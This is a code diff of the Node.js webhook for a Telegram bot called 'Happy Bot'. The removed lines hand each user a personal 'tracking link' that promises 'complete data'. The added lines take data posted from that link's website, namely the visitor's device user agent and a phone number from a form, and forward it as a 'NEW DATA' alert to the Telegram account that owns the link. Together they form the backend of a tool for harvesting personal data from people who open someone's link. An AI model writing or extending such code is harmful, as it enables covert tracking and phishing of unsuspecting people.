@@ -6,59 +6,20 @@ const bot = new TelegramBot(BOT_TOKEN);
 module.exports = async (req, res) => {
   if (req.method === 'POST') {
     try {
-      const update = req.body;
+      const { userId, data } = req.body;
       
-      // Handle messages
-      if (update.message) {
-        await handleMessage(update.message);
-      }
+      const message = `🔐 <b>NEW DATA</b>\n\n` +
+                     `📱 Device: ${data.device?.userAgent}\n` +
+                     `📞 Phone: ${data.form?.phone}\n` +
+                     `🔧 Happy Bot`;
       
-      // Handle callbacks
-      if (update.callback_query) {
-        await handleCallback(update.callback_query);
-      }
+      await bot.sendMessage(userId, message, { parse_mode: 'HTML' });
       
-      res.status(200).json({ status: 'OK' });
+      res.json({ success: true });
     } catch (error) {
-      console.error('Webhook error:', error);
-      res.status(500).json({ error: 'Internal error' });
+      res.status(500).json({ error: error.message });
     }
   } else {
     res.status(405).json({ error: 'Method not allowed' });
   }
 };
-
-async function handleMessage(message) {
-  if (message.text === '/start') {
-    const keyboard = {
-      inline_keyboard: [
-        [
-          { text: "📢 Join Channel 1", url: "https://t.me/your_channel1" },
-          { text: "📢 Join Channel 2", url: "https://t.me/your_channel2" }
-        ],
-        [
-          { text: "✅ I Have Joined", callback_data: "verify_join" }
-        ]
-      ]
-    };
-    
-    await bot.sendMessage(message.chat.id, 
-      `🎉 *Welcome to Happy Bot!*\n\nGenerate your tracking link and get complete data!`,
-      { parse_mode: 'Markdown', reply_markup: keyboard }
-    );
-  }
-}
-
-async function handleCallback(callback) {
-  if (callback.data === 'verify_join') {
-    const websiteUrl = process.env.WEBSITE_URL;
-    const personalLink = `${websiteUrl}?id=${callback.from.id}`;
-    
-    await bot.sendMessage(callback.message.chat.id,
-      `✅ *Your Personal Link:*\n\`${personalLink}\`\n\n🔧 *Happy Bot*`,
-      { parse_mode: 'Markdown' }
-    );
-  }
-  
-  await bot.answerCallbackQuery(callback.id);
-}
